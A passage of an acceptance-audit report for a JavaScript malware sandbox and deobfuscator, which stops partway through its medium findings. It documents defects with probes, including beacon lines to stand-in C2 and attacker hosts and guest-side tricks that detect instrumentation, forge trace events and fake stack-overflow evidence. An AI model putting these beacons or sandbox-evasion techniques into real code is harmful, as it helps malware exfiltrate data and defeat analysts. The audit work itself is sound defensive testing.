# Acceptance wave — decision updated 2026-10-21 (working tree)

Sections 1–10 are the independent audit of commit `f0255dc` (2026-10-20,
`style(repo): normalise incidental body whitespace`), clean tree, Node.js
v24.19.0, pnpm 12.14. That audit decided **REJECT**. It stays as the defect
record. It is the successor to [`ASSESSMENT.md`](ASSESSMENT.md) (baseline
`f3d1c2a`) and [`ALIGNMENT.md`](ALIGNMENT.md) (dispositions for that baseline);
it does not replace either.

**Current decision: ACCEPT-WITH-CONDITIONS** on the working tree of 2026-10-21
(Node.js v24.19.0). The P0 gate has passed and the full suite is green. This is
not an unconditional ACCEPT: P1 fidelity items H1–H4 were not re-probed item by
item, and they stay in Known limits (§11).

**Measurement basis for §§1–10.** Every number and every probe in those sections
was produced on `f0255dc`. The audit ran as 21 fresh-context parallel reviewers,
each owning one orthogonal seam and each required to return `file:line` evidence
plus a failure mechanism; 15 were read-only, 6 were authorised to execute
bounded probes. The integrator then re-ran or re-derived every P0 claim before
accepting it (Section 9 records the one claim that did **not** survive that
check). No file under `tools/` was modified for the audit. The probes under
`tests/fixtures/acceptance/` are that record. The closures in §11 were measured
later, on the working tree, and are not numbers from `f0255dc`.

**Verdict at `f0255dc`: REJECT for release as a forensic gate.** The suite was
green and the engineering culture was real, but 12 verified P0 defects either
corrupted restored code, corrupted forensic output, or handed the analysed
sample control over the evidence. A green suite was not acceptance evidence
then: no test in that suite caught any of these defects (Section 10). Those P0s
are closed on the current tree (§4, §11).

---

## 1. Gates (audit at `f0255dc`)

Not re-run for the 2026-10-21 decision, except the full suite and the type
check recorded in §11. Do not read this table as the current result.

| # | Gate | Command | Result | Verdict |
| --- | --- | --- | --- | --- |
| 1 | Full suite | `node --test --test-concurrency=1 tests/*.test.js` | 883 tests / 883 pass / 0 fail / 0 skipped / 0 todo / 0 cancelled, 97.6 s, **0** `Aborted(` lines | **PASS** |
| 2 | Coverage on `tools/**` | same + `--experimental-test-coverage --test-coverage-include='tools/**'` | 90.16 % line / 81.67 % branch / 89.05 % function | **PASS** (branch margin 1.7 pts) |
| 3 | Type consumer | `npx tsc -p tests/fixtures/types/tsconfig.json` | exit 0 | **PASS** |
| 4 | Example corpora | `node --test tests/examples*.test.js` | 34/34 (examples 12, works 6, products 6, suite 6, mega 4) | **PASS** |
| 5 | National SDK | `node examples/national-sdk/verify.mjs --no-build` | 37/37, exit 0 | **PASS with caveat** (C5) |
| 6 | Packaging | `npm pack --dry-run` | 118 files, 484 kB; only `tools/`(93) + `docs/`(11) + `types/`(11) + README/LICENSE/package.json; bin `100755` | **PASS** |
| 7 | CLI contract | 21 invocations from `docs/API.md` | documented matrix passes; 4 deviations (H12) | **PARTIAL** |
| 8 | Security-model claims | `SECURITY-MODEL.md` row by row | 4 claims false at HEAD (P0-1, P0-2, P0-3, P0-10) | **FAIL** |
| 9 | Forensic-output integrity | trace → report → markdown | trace forgeable (P0-1), verdict can miss dynamic evidence (P0-6), Markdown injectable (H8), IOC categories starvable (H7) | **FAIL** |
| 10 | Restore semantics | differential restore probes | 3 verified wrong-output classes (P0-4, P0-7, P0-8) | **FAIL** |
| 11 | Traceless promise | detection oracles from the guest | channel reachable + enumerable (P0-1); timing grid changed by tracing (H14) | **FAIL** |
| 12 | Determinism | two-process byte comparison | identical after stripping host-time fields, but the wall deadline makes observed steps and the verdict host-speed dependent | **FAIL** |
| 13 | Performance | scaling at documented caps | IOC extraction quadratic on dense input (>240 s at 2 MB) | **FAIL** |

Only gates 1–6 are currently enforced by CI-equivalent commands. Gates 8–13
are exactly the ones a forensic product cannot skip.

## 2. Scorecard

Scores are the integrator's consolidated judgement after re-verification, not
the average of reviewer self-scores.

| Dimension | Score | One-line verdict |
| --- | --- | --- |
| Architecture / layering | 7.0 | Real DAG, deliberate dependency injection at the riskiest edges; enforcement is absent and 4 facades are decorative. |
| Security & isolation | 5.5 | No realm escape found, but three reachable breaks of the *evidence* boundary: forged host-stack proof, unowned listener handles, reachable instrumentation channel. |
| Sandbox fidelity — DOM/events/canvas | 5.0 | Cookie/URL/Intl/storage are credible; interface constructors, event propagation, canvas pixels and `location` setters are not. |
| Sandbox fidelity — network/time | 6.5 | One IOC per routed request, deterministic clock, honest refusal accounting; beacons via `img.src` bypass the network service entirely, and refused delivery silently drops the `net` event. |
| Crypto & encoding | 4.0 | Published AES/SHA vectors pass; BufferSource windows, NUL code units and view-based RNG are wrong, and AES-GCM ignores AAD and `tagLength`. |
| Restore — pipeline/fold/dead-code | 6.0 | Generate cache and conservative guards are good; two verified wrong-output classes in `dead-code`. |
| Restore — strings/array/proxy/rename | 6.0 | Rotation and reference semantics are guarded; `string-array` deletes dynamically-referenced arrays. |
| Instrumentation | 5.0 | Historical O(k·n) and undefined-binding defects genuinely fixed; budget path and sequence-argument handling are not. |
| Hooks & trace recorder | 6.5 | Envelope/sanitisation/snapshot semantics match the contract exactly; four smaller correctness defects, one of which lets a throwing logger abort the run. |
| Analysis / IOC / report | 5.0 | Detector filters and schema are strong; the verdict reads different evidence than the counts it prints, and IOC budgets starve high-value categories. |
| JSVMP | 6.0 | ISA/interpreter are faithful by construction; the analyser over-claims (ordinary loops → `stack-vm`, fabricated mnemonics). |
| Engine / invocation / stealth | 6.0 | Disposal ordering and intrinsic evidence are strong; one forgery path and two decorative limits. |
| API / types / CLI / packaging | 6.5 | 68-name barrel exact, strict CLI, clean tarball; several declaration lies, one unused 34 MB dep, four CLI deviations. |
| Code quality | 7.0 | Consistent taxonomy, no TODOs, good constant ownership; duplication at the `pass-context`/`platform-kit` seams already produced one live bug. |
| Docs as contract | 6.0 | Enumerations match; five current-doc claims are wrong, two analyst-visible. |
| Test suite | 7.0 | Evaluated-value equivalence, real negative tests, honest coverage; the leak invariant is not enforced and the green suite misses every P0 below. |
| Traceless | 5.0 | Native masking and non-guessable bindings are careful; the channel is enumerable and reachable, and tracing changes guest-observable time. |
| Determinism | 6.0 | Byte-identical after host-time fields are stripped and seed-invariant, but the host wall deadline makes observed steps and the verdict host-speed dependent. |
| Performance | 4.0 | Insertion and trace-ring hot paths fixed; IOC regexes are quadratic on dense input and the documented caps do not fire. |
| Integration gates | 8.0 | Every user-visible gate passes; the SDK manifest hashes a mislabelled digest and `--no-build` never hashes. |

Arithmetic mean ≈ **5.9 / 10**. For comparison, `ASSESSMENT.md` recorded 7.8/10
at `f3d1c2a` with 2 CRITICALs; the delta is not a regression in engineering
quality — it is what happens when the same code is examined against forensic
claims rather than against its own suite.

## 3. Determinism and performance

### Determinism — FAIL as the documented guarantee

What holds (verified by the lane and re-checked by the integrator):

- Two **cold** processes, same seed: report JSON is identical after removing
  `wall`, `startedAt`, `durationMs`; 186/186 trace events are identical after
  removing `wall`; `restore()` text and per-pass `id/changed` are identical;
  `cli analyze --json` differs only on those three keys.
- No cross-run state: running `string-array-obfuscated` + `anti-analysis` before
  `sample-loader` yields the same report as `sample-loader` alone; `Promise.all`
  equals sequential; per-run caches reset.
- Seed sweep (1, 2, 3, 7, 42, 24301): identical verdict level/score/reasons,
  artifact ids, event filename hash, IOC offsets/counts, `dynamic.counts` and
  restored SHA-256. Only profile, `runId` and seeded latencies move.
- Virtual clock is exact: fixed epoch, `t` non-decreasing (0 inversions),
  `setTimeout(fn, 500)` lands on `epoch+500`. No host pid/os/cwd/hostname in the
  report (pid exists only in the pino base).

What breaks the guarantee:

- **The host wall deadline bounds how much is observed.** `engine/runtime.js:145`
  compares `Date.now() - startedAt > limits.timeoutMs` inside the interrupt
  handler. With `timeoutMs: 95`, one process, seven identical runs:
  `counts.byKind.code` 6 034 → 20 003, `tracing.truncated` flips, and
  `truncatedBy` gains `code-budget`/`event-limit`. A 12 000-statement spin then
  `fetch` scores **23** cold with `DYNAMIC_LIMITS:10` + `DYNAMIC_UNCAUGHT:2` and
  a spin-loop recommendation, but **11** on a warm fourth run with neither.
  `docs/ARCHITECTURE.md:321-324` promises report JSON identical except
  `wall/startedAt/durationMs`; a load- and JIT-dependent score falsifies it. This
  is P0-12.
- **Markdown is not reproducible.** Per-pass `Date.now()` durations are rendered
  into the pass table (`report.js:584-588`), so two CLI runs differ on ~10 lines;
  `tests/determinism.test.js` never compares `markdown` (H22).
- **Host ICU data leaks into guest-visible results in principle.** Guest
  `getTimezoneOffset`/`toLocale*` use host tzdata (`util/timezone.js:19`,
  `env/time.js:171,373`), and env install-order ties (two modules with
  `order: 80`) are broken with host-locale `localeCompare`
  (`env/index.js:112`). Neither was observed to differ on one host; both are
  cross-host risks, not current failures.

### Performance — FAIL (two reachable cliffs, the rest linear)

Measured exponents (`t(2n)/t(n)` log2 slope) at the documented caps:

| Path | Measurement | Verdict |
| --- | --- | --- |
| `applyInsertions`, both twins | k fixed 40 000, n 1→8 MiB: 3.40/3.35/3.10/3.29 ms (exp **-0.02**); k 10k/20k/40k at 4 MiB: 0.86/1.60/3.02 ms | **fixed**, linear |
| `instrument()` | 103 KB→842 KB: 50.7/90.4/171.9/331.5 ms (exp **0.95**) | linear |
| `restore()` | 0.10→0.84 MB: 198/467/960/2 021 ms (exp **1.12**); 11 passes x 2 rounds dominate, no single pass | linear-ish |
| trace recorder | emit 5k/10k/20k = 3.5/5.9/12.7 ms; ring same cost; `events` snapshot ~0 | **fixed** |
| `buildReport`/JSON | 5k/10k/20k events = 0.3/0.5/1.0 ms / 0.9/1.7/3.5 ms | linear |
| `sanitizePayload` | array preview 5 000→101 entries; 40k object keys 18.6 ms | bounded |
| `EMAIL_RE` inside `extractIOCs` | 4/8/16/24 KB of `'a'` = 14/41/153/334 ms (exp **1.90-2.04**); ~98 % of IOC time; 200 KB ~24 s; 5 MB ~hours | **quadratic, P0-11** |
| `ioc.js:497` per-domain prefix slice | 1 MB pad + 2 000 domains >240 s (killed) | **quadratic, P0-11** |
| `jsvmp.js:117` `lineOf` | 1 MB with k=500/1000/2000 cases = 1.27/2.53/5.09 s; 2 MB/k=2000 = 10.4 s | O(k*n), M |
| instrumentation plan retention | 6.6 MB source, `maxInsertions:1000` -> `plan.size` 480 001, **69.9 MB** retained | memory cliff, H21 |

The IOC cliff is narrower than first reported: `DOMAIN_RE` measures <=0.1 ms at
16 KB, so the fix can be scoped to `EMAIL_RE` (unbounded unanchored local part)
plus the per-domain `slice().trim()` at `ioc.js:497`. The 5 MiB `maxLength` cap
never fires because zero-match input is the slowest case.

## 4. Blocking findings (P0) — closed on the working tree

Each mechanism below was verified as a defect at `f0255dc` (**[V]** / **[A]** /
**[S]**). On the 2026-10-21 tree every row is a hard assert in
`tests/acceptance-p0.test.js` (17/17, which also covers H9 and H21). The
write-ups are the defect record.

Severity rule used here: **P0** means an analyst can be given a wrong answer, or
the sample can influence the evidence, or an ordinary benign sample is reported
as a leak. Evidence marks: **[V]** integrator probe,
**[A]** reviewer-executed probe, **[S]** static proof.

### P0-1 — The instrumentation channel is guest-reachable and can forge trace events **[V]** **[CLOSED]**

`tools/instrumentation/code.js:154-176` installs the trace channel with
`ctx.setProp(documentHandle, channelSymbol, channel)`; the property is an ordinary
own property, so it is `enumerable: true, configurable: true, writable: true`.
`tools/sandbox/env/anti-fingerprint.js:553-566,710` hides the symbol only by
filtering `getOwnPropertySymbols`/`ownKeys`/`getOwnPropertyDescriptors`.
`Object.assign` uses `[[OwnPropertyKeys]]` + `[[Set]]`, so a Proxy set trap sees
the symbol anyway.

Probe `tests/fixtures/acceptance/traceless-oracles.mjs`:

```
stolenKey: "ai4r.channel.53fc7f96de.0"
channelType: "function"
channelDescriptor: { enumerable: true, configurable: true, writable: true }
getOwnPropertySymbols(document).length: 0   (the filter is the only defence)
```

Probe `tests/fixtures/acceptance/trace-forgery.mjs`: calling the stolen channel
with `(8, id, 'forged-3')` emits a real `code`/`step` event whose `value` is
`forged-3` and whose `id`/`line`/`fn` are chosen by the guest; each call also
increments the event budget. The sample therefore (a) detects instrumentation
with a two-line oracle, (b) injects attacker-chosen forensic events, and (c) can
exhaust `maxEvents` so the *real* events are dropped.

An independent lane found a second, tighter oracle for the same property: a
Proxy `getOwnPropertyDescriptor` trap receives the raw symbol before the filter,
leaking `Symbol.keyFor(sym)` and yielding six forged `code:step` events in one
run. Non-enumerability alone does not close the descriptor trap; the fix must
also keep the key out of the global symbol registry (a plain `ctx.newSymbol`
value cannot be named by the guest).

Smallest fix: define the symbol property with `enumerable: false` (non-enumerable
properties are never copied by `Object.assign`/spread) and keep the filter as
belt-and-braces. Regression: the two probes above asserted in
`tests/traceless.test.js`.

### P0-2 — A guest can forge host stack evidence and quarantine the module **[V]** **[CLOSED]**

`tools/sandbox/env/misc.js:128-130` builds a **host** `Error` from a guest
`reason` and copies `name`/`message`; `tools/sandbox/bridge.js` `toGuestError`
preserves both; `tools/engine/runtime.js:316-333,390-405` certifies
`name === 'RangeError' && message === 'Maximum call stack size exceeded'` as an
engine signal and increments the counter the docs call "guest-unwritable".

Probe `tests/fixtures/acceptance/host-evidence-forgery.mjs`:

```js
const c = new AbortController()
c.abort({ name: 'RangeError', message: 'Maximum call stack size exceeded' })
try { c.signal.throwIfAborted() } catch {}
```

Result: `limitsHit: ["stack"]`, `stackExhaustion: true`,
`disposal: { ok: false, leaked: true, stage: "runtime", skipped: true }`. A
benign-looking sample therefore fabricates a stack-overflow verdict, abandons
the runtime, and forces the next run to recompile the WASM module.

Smallest fix: in the bridge's catch, rethrow host engine throws unconverted and
tag converted errors with an exported symbol; make the exact-match classifier
reject tagged values.

### P0-3 — An element listener holds an unowned handle; ordinary samples report a leak **[V]** **[CLOSED]**

`tools/sandbox/env/canvas.js:1140` stores `callback.dup()` in module state but
never registers it with the module's teardown set (`:711-720`), and only
`removeEventListener` (`:1153`) frees it. `CONTRACTS.md:24-26` says exactly this
shape is an engine abort at `runtime.dispose()`.

Probe `tests/fixtures/acceptance/disposal-leak.mjs` (the ordinary pattern
`new Image().addEventListener('load', fn)`):

```
Aborted(Assertion failed: list_empty(&rt->gc_obj_list), …)
disposal: { ok: false, leaked: true, stage: "runtime" }
```

This is the highest-frequency P0: loaders that attach load/error handlers and
never remove them are the normal case, and the platform then reports the sample
as a handle leak and quarantines the module (~21.7 MB RSS + recompile per
following run).

Smallest fix: `list.push(retain(callback.dup()))` and `release()` on removal so
teardown covers the rest.

### P0-4 — Instrumentation changes semantics: `throw a, b` throws `a` **[V]** **[CLOSED]**

`tools/instrumentation/code.js:351-352,368-369` splice the throw/step probe
around the whole `argument` range. For `throw a, b` (a legal `SequenceExpression`
argument) the channel receives `(op, id, a, b)` and returns `args[2]`, i.e. `a`.

Probe `tests/fixtures/acceptance/restore-jsvmp-regressions.mjs`:
`var a = 1, b = 2; try { throw a, b } catch (e) { c = e } c` returns **2** at
`level: 'off'` and **1** at `level: 'statement'`.

Smallest fix: parenthesise the spliced argument, or skip when
`argument.type === 'SequenceExpression'`.

### P0-5 — The insertion budget can split a paired splice and blame the sample **[V]** **[CLOSED]**

`code.js:213-222` counts fragments, so `maxInsertions` can be reached between the
opening `_$q(8,id,` and the closing `)`. Probe
`tests/fixtures/acceptance/instrumentation-budget.mjs` on
`function f(){ throw new Error('x') } f()`:

```
maxInsertions 5 → errorName: "SyntaxError", message: "expecting catch or finally"
maxInsertions 6 → same
```

The run is reported as a sample syntax error under the sample filename, with
shifted line numbers, and `instrument.budget` is emitted but never consumed by
the report (so `tracing.truncated` stays false).

Smallest fix: treat a probe's fragments as one atomic insertion unit, and
`parse()` the spliced result with a recorded `instrument.invalid` fallback.

### P0-6 — The verdict reads different evidence than the counts it prints **[V]** **[CLOSED]**

`tools/analysis/orchestrator.js:225` slices `dynamic.events` to 5 000 while the
recorder retains up to 20 000; `tools/analysis/report.js:381-383` then computes
`counted(kind)` from that slice (`events.length > 0 ? eventCount(kind) : counts`).

Probe `tests/fixtures/acceptance/verdict-retention.mjs` (6 000-iteration loop,
then `fetch('https://c2.example/beacon')`):

```
keepTrace: true   → counts.byKind.net: 1,  score 13, reasons: [STATIC_NETWORK, IOC_URLS]
keepTrace: false  → counts.byKind.net: 1,  score 24, reasons: [..., DYNAMIC_NETWORK, DYNAMIC_DOM]
```

The same input scores 13 or 24 depending only on trace retention, and the
`DYNAMIC_NETWORK` reason is absent exactly when the sample is long enough to push
the beacon past the slice. Network+DOM+eval are worth up to 35 points, enough to
move `malicious` to `benign`. With `keepTrace: false` the fallback counts raw
platform events (`sandbox`, `api`, `dom` installation events), which the schema
explicitly says must not score.

Smallest fix: score from `behavior.counts` (already guest-filtered) or from
`counts.byKind` minus `behavior.counts.platform`, and set a
`dynamic.eventsTruncated` flag whenever the slice drops events.

### P0-7 — `string-array` deletes code reachable only through dynamic access **[V]** **[CLOSED]**

`tools/restore/passes/string-array.js:990,995,1037` removes declarations whose
`binding.referencePaths` is empty, without checking for `eval`, `with`, or a
global alias (`window.name`).

Probe `tests/fixtures/acceptance/restore-jsvmp-regressions.mjs`:

```
input : var _0xa = ['alpha',...]; window.log(window._0xa[0]);
output: window.log(window._0xa[0]);        // array deleted → TypeError at runtime
```

`CONTRACTS.md:488` says surviving code must keep its observable semantics. The
pass must bail on any dynamic-access shape before removal, mirroring
`rename.js:165-178`.

### P0-8 — `dead-code` takes the wrong branch for bigint literals **[V]** **[CLOSED]**

`dead-code.js:51` is `if (t.isBigIntLiteral(node)) return node.value !== '0'`. In
the pinned parser, `BigIntLiteral.value` is a BigInt primitive, so the comparison
is always true.

Probe `tests/fixtures/acceptance/restore-jsvmp-regressions.mjs`:
`if (0n) { live() } else { dead() }` restores to `{ live(); }` — the dead arm.
`dead-code.js:145` additionally calls an undefined `isPrologueEntry`, which
`runPass` swallows (`pass-context.js:63-76`): the pass then reports
`changed: false` with `error: "isPrologueEntry is not defined"` while earlier
removals already mutated the AST. Both are verified in the same probe.

Smallest fix: compare against `0n` (or bail), import `isDirectiveSlot` from
`pass-context.js`, and make a pass error fail the pass list rather than degrade
silently.

### P0-9 — BufferSource windows and NUL code units are corrupted **[V]** **[CLOSED]**

Three independent mechanisms in the crypto/encoding surface:

1. `env/crypto.js:260-279` `readBytes` ignores `byteOffset`/`byteLength`.
   Probe: `SHA-256` of `new Uint8Array(buf.buffer, 4, 4)` returns
   `be45cb26…` = `sha256(all 16 bytes)`, not `c6d44cf4…` = `sha256([4,5,6,7])`.
2. `env/crypto.js:30-47` `getRandomValues` indexes by element `length`, not
   `byteLength`. Probe: `new DataView(new ArrayBuffer(8))` is all zeros;
   `Uint32Array(4)` yields bytes-in-slots `[107,142,67,203]`;
   `Uint32Array(16385)` (65 540 bytes) does not throw the documented quota error.
3. `env/encoding.js:41-64,83-131` builds strings with NUL-terminated
   `newString`/`getString`. Probe: `atob('AA==').length === 0`,
   `btoa('a\u0000b') === 'YQ=='`, `TextEncoder().encode('a\u0000b')` → `[97]`,
   `TextDecoder().decode([97,0,98])` → `"a"`, and
   `encodeInto('€', Uint8Array(2))` → `{read: 2, written: 2}` instead of `{0,0}`.
   The public `tests/env-encoding.test.js:186-196` currently pins the wrong
   `encodeInto` numbers.

Smallest fix: slice by the view window; write/read strings by code unit; use
`byteLength` and a guest byte window for RNG; add the published vectors as tests.

### P0-10 — The classic `img.src` beacon is neither traced nor reported as an IOC **[V]** **[CLOSED]**

`env/canvas.js:2280-2295` records `dom before {api:'img.src', length:29}` and
`env/dom.js:1870` installs no setter at all for created elements; nothing calls
`network.computeResult`/`reportIOC` (those calls exist only in `network.js:184,204`,
`location.js:62`, `navigator.js:343,377`, `globals.js:119`).

Probe `tests/fixtures/acceptance/dom-oracles.mjs` with
`new Image().src = 'https://c2.example/beacon?d=1'`:

```
counts: { ioc: 0, net: 0, imgEvents: 1 }   // event carries no URL
```

`SECURITY-MODEL.md:16` says "Every request is a trace event + IOC". The most
common exfiltration primitive in the corpus violates it, and
`analysis/ioc.js:175` only harvests `net`/`ioc`/`eval`, so the C2 host never
reaches `dynamic.iocs`.

Smallest fix: in the `src` setter, route the URL through the network service
(policy result), emit `net`, and call `reportIOC`.

### P0-11 — IOC extraction is quadratic and the 5 MiB cap never fires **[V]** **[CLOSED]**

`analysis/ioc.js:182` (`EMAIL_RE`) has an unanchored, unbounded local part
(`[\w.+-]+`): on a word run it consumes the whole run, fails on `@`, and retries at
every offset, so zero matches is the slowest case. Measured: 200 000 x `'A'` ->
22 694 ms; 4/8/16/24 KB -> 14/41/153/334 ms (exponent 1.90-2.04); a 2 MB `'a.'`
string exceeded **240 s** and was killed. `DOMAIN_RE` measures <=0.1 ms at 16 KB,
so this is one regex, not the whole detector set. A second quadratic path sits at
`ioc.js:497` (`text.slice(0, match.index).trim()` per domain match): 1 MB of
padding plus 2 000 domains did not finish in 240 s. `IOC_LIMITS.maxLength`
(5 MiB) never fires because zero-match input is the slowest case. This is a
denial-of-service on the analyst, not on the guest.

Smallest fix: `/(?<![A-Za-z0-9._%+-])[\w.+-]{1,64}@(?:[a-z0-9-]{1,63}\.)+[a-z]{2,24}/gi`
(O(64n)), and precompute the first non-space index once instead of slicing a
prefix per match.

### P0-12 — The host wall deadline makes the verdict host-speed dependent **[A]** **[CLOSED]**

`engine/runtime.js:145` interrupts on `Date.now() - startedAt > limits.timeoutMs`,
so how many guest steps are observed depends on host speed and JIT warmth. With
`timeoutMs: 95`, one process, seven identical runs: `counts.byKind.code` 6 034 ->
20 003, `tracing.truncated` flips, `truncatedBy` gains `code-budget`/`event-limit`.
A 12 000-statement spin then `fetch` scores **23** cold (with `DYNAMIC_LIMITS` and
`DYNAMIC_UNCAUGHT`) and **11** on a warm run (neither), and the cold run adds a
"runtime interruption usually indicates an anti-analysis spin loop"
recommendation. `ARCHITECTURE.md:321-324` promises report JSON identical except
`wall/startedAt/durationMs`; this falsifies it and can move a verdict on a loaded
analysis host.

Smallest fix: make the guest-derived bound (`clock.elapsedMs` / statement budget)
primary and keep the host clock as a backstop that marks the run
`dynamic.provisional: true`, suppresses limit/spin-loop recommendations, and sets
`tracing.truncated`.

## 5. High findings (P1)

Rows are the `f0255dc` defects. **CLOSED** on the working tree, with the
evidence in §11: H9, H10, H12, H13, H21. H1–H4 were not re-probed and are
conditions of the current decision. The other rows were not re-audited.

| ID | Location | Defect | Evidence |
| --- | --- | --- | --- |
| H1 | `anti-fingerprint.js:225-252`, `env/navigator.js:24-57` | Interface constructors are never installed (24 of the 69 branded globals are absent, including `Navigator`, `Screen`, `Location`, `History`, `Performance`, `Crypto`, `DOMException`, `Range`, `ReadableStream`, `Selection`); `navigator.constructor` has no `.prototype`; fingerprint scalars are data properties, not `get` accessors, contradicting `RESEARCH-ANTI-ANALYSIS.md:53`. | **[V]** `typeof Navigator === 'undefined'`; `Object.getPrototypeOf(navigator) === Navigator.prototype` unanswerable; `getOwnPropertyDescriptor(proto,'userAgent') === null`; **[A]** missing-globals list. |
| H2 | `env/dom.js:1490-1531` | `dispatchEvent` walks only the target's own listeners; `bubbles`/`composed` ignored; `composedPath()` is `[target]`; document/window listeners never fire; `el.click()` same. | **[V]** `docHits: 0`, `winHits: 0` for a bubbling event on a child of `body`. |
| H3 | `env/canvas.js:1596-1660`, `imageDataBytes ~:400` | `getImageData` is independent of drawing: blank canvas reads opaque profile noise `[247,237,66,255]` (spec: `[0,0,0,0]`), and a painted pixel reads identically. Breaks pixel-decode payloads and restored-code equivalence. | **[V]** `blank === painted === [247,237,66,255]`. |
| H4 | `env/location.js:37-39`, `env/globals.js:95-101`, `env/dom.js:407-409` | `location.href = …`/`window.location = …` are silent no-ops with no IOC; `document.location` is never installed (`TypeError`), while `location.assign()` does navigate — inconsistent within one API. | **[V]** href unchanged after assignment; `typeof document.location === 'undefined'`. |
| H5 | `jsvmp/analyze.js:334-342,348-352,571-577` | Ordinary loop+switch+array code scores as a JSVMP (`detected: true`, `kind: 'stack-vm'`, 80) and gets probes spliced; the repo's negative test avoids the shape. | **[V]** probe on an `ordinary()` loop+switch function. |
| H6 | `jsvmp/analyze.js:453-463`, `instrumentation/jsvmp.js:233-237` | Unrecognised case bodies fall back to `OPCODE_BY_CODE.get(code)` and `semanticFor`, fabricating canonical mnemonics and semantics for foreign bytecode numbers. | **[S]** |
| H7 | `analysis/ioc.js:398-404,437-453` | `maxCandidates` is global and consumed before filters, so a sample with >2 000 domain-like tokens starves hashes/wallets/Telegram/base64. | **[V]** 2 100 unique `hostN.com` + a valid BTC address → `wallets: 0`, `meta.truncated: true`; alone → `wallets: 1`. |
| H8 | `analysis/report.js:842-870,914-925,1163` | `escapeText` does not escape `[`/`]`/`!`, and `summarize()` returns raw `JSON.stringify`, so guest text injects live Markdown. The report also keeps the **oldest** 50 hook errors (`slice(0,50)` over an oldest→newest ring) while the schema says newest. | **[V]** `renderMarkdown` contains `![x](https://attacker.example/t)`; **[S]** slice direction. |
| H9 **CLOSED** | `hook/hookbus.js:140-147,260,309,379,461`; `instrumentation/trace.js:176-182` | Wildcard phase matches twice (`pipeline('code:*')` applies a transform twice); `once` is not removed when the handler throws; a throwing `logger.warn` escapes `dispatch` (contradicting "never propagates"); `child('hook').child('net').emit()` throws `unknown trace kind`. | **[V]** `steps: 2`, `onceThrow.ran: 2`, `threw: 'log-boom'`, `unknown trace kind: hook.net`. |
| H10 **CLOSED** | `engine/limits.js:12,28` | `interruptQuantumMs` and `maxStageDepth` are declared, typed, documented — and read by nothing (`grep` finds only `limits.js`, `types/ai4reverse.d.ts`, one test comment). `interruptQuantumMs` is hard-coded `0.1` in the clock. | **[V]** repo-wide grep; contradicts "Every limit is enforced; none is decorative." |
| H11 | `sandbox/integrity.js:80-121` | The after-snapshot resolves `JSON.stringify`/`getOwnPropertyNames`/`Function.prototype.toString` from live guest globals, so a sample can return a captured pristine snapshot and defeat `intact`. | **[S]** (converse failure `{kind:'unavailable'}` is not in the schema's drift kinds). |
| H12 **CLOSED** | `cli.js:159-166,303,351,376,272-274` | Default seed is the **number** `0x5eed`; `--seed 0x5eed` is a **string** hashed by `hashSeed`, producing a different profile. `analyze` exits 0 when the sample throws (`run` exits 1). `--events` is accepted and silently discarded by `analyze`/`restore`. No-argument invocation prints usage to stdout and exits 0. | **[V]** different UA/OS for default vs explicit seed; `analyze: 0` vs `run: 1`; `--events` cases `0`; no-args `0`. |
| H13 **CLOSED** | `package.json:110`, `pnpm-lock.yaml:35,365,660` | `z3-solver@^5.3.1` is a shipped runtime dependency imported nowhere; `docs/VERIFICATION.md:29-34` claims it was removed and quotes a command that now returns 3. `node_modules/z3-solver` is 0 B, i.e. the green suite runs on a stale install. | **[V]** grep tools/tests → 0; lockfile → 3 entries; docs claim → false. |
| H14 | `instrumentation/code.js:117`, `sandbox/clock.js:82-83`, `env/performance.js:17` | Each traced statement ticks the virtual clock by 0.001 ms, so guest-observed `performance.now()` has a 1 µs grid that no claimed browser produces (100 µs clamp), and `level: 'off'` freezes the clock. Instrumentation is therefore visible in timing. | **[V]** after 50 statements `performance.now() = 1009.103` (microsecond grid); `level:'off'` returns integer ms. |
| H15 | `tests/helpers/harness.js:100-115` + 250 call sites | The documented leak invariant is not enforced: 267/327 `.dispose()` sites discard the record. A live `ctx.newString` at dispose returns `{ok:true, leaked:false}`, and a context-scope leak prints `Aborted(…)` while the test still passes. | **[V]** harness probe: live handle, `disposal.ok: true`. |
| H16 | `api.js:202`, `fetch.js:548-561`, `network.js:205` | API wrapper arity comes from a static table (wrapping `XHR.open` reports 5, shim has 3); `signal` is dropped by `fetch`; a refused network delivery timer leaves `pending` set and the promise never settles (probe: `net: 0, ioc: 1`, `settle.jobs: 0`). | **[S]** arity/signal; **[V]** missing `net` event. |
| H17 | `invocation/invoke.js:109-115`, `restore/index.js:77`, `restore/generate.js:31` | A host `RangeError` from Babel analysis/generation escapes outside the stack guard. 40 001 chained `.a` members: `analyzeSource()` throws host `RangeError`, `sandbox.run()` surfaces an unclassified `SandboxError` (no `limitsHit`, no disposal record), and `restore()` throws uncaught instead of returning `outputValid:false` + unchanged input. | **[V]** `parse()` succeeds, `analyzeSource()` throws, `restore()` throws `Printer._catchUp`. |
| H18 | `env/dom.js:1789` | Bridged DOM methods keep an own `prototype` and `[[Construct]]`: `new document.querySelector('div')` yields an object where a browser throws. | **[A]** |
| H19 | `invocation/stealth.js` sanitiser; `env/dom.js` dispatch | Sanitised stacks lose the `Error: message` header (leading blank line) and listener frames read `at call (native)` plus blank lines, revealing a JS wrapper between `dispatchEvent` and the callback. | **[A]** |
| H20 | `sandbox/profile.js:270` | The Edge UA always appends `Mobile`, so a desktop macOS profile reports `... Mobile Safari/537.36 Edg/...`; the consistency report has no inverse check. | **[A]** |
| H21 **CLOSED** | `instrumentation/code.js:224-236` | The plan `Map` records every site and is never budget-gated: a 6.6 MB source retains 480 001 entries / **69.9 MB** even with `maxInsertions: 1000`, because `currentPlan` keeps the map alive. | **[A]** |
| H22 | `restore/pass-context.js:87`, `report.js:584-588` | Per-pass `Date.now()` durations are rendered into the markdown pass table, so the text artifact differs on every run; no test compares `markdown`. | **[A]** |
| H23 | `instrumentation/api.js:464,488` | A swallowed wrap failure is only `logger.debug`: one cold run reported 57 wrapped APIs vs 58 for an identical sample, with no event or counter (not reproduced in 30 retries). | **[A]** latent |
| H24 | `instrumentation/jsvmp.js:117` | `lineOf` slices and splits the whole prefix per case: 1 MB with 2 000 cases = 5.1 s, 2 MB = 10.4 s, O(k*n) for metadata only. | **[A]** |
| H25 | `util/timezone.js:19`, `env/time.js:171,373`, `env/index.js:112` | Guest tz/locale output derives from host ICU/tzdata, and env install-order ties (`order: 80`) use host-locale `localeCompare`; cross-host reproducibility is not guaranteed (not observed on one host). | **[A]** latent |

## 6. Medium and low findings (condensed)

- **Duplication at the shared seams.** `pass-context.js` exports
  `isDirectiveSlot`/`isPrologueEntry`/`inWithScope` but three passes keep private
  copies (`constant-fold.js:379`, `strings.js:467`, `member-fold.js:430`), and
